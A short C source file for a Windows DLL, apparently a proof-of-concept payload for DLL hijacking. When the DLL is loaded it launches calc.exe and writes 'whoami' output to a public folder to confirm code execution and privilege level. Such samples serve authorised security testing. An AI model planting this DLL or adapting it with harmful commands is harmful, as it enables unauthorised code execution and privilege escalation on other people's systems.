#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Ejecutar calculadora como prueba de ejecución de código
        system("calc.exe");

        // Capturar el contexto de ejecución y escribirlo en un archivo
        system("whoami > C:\\Users\\Public\\privilege_test.txt");
    }
    return TRUE;
}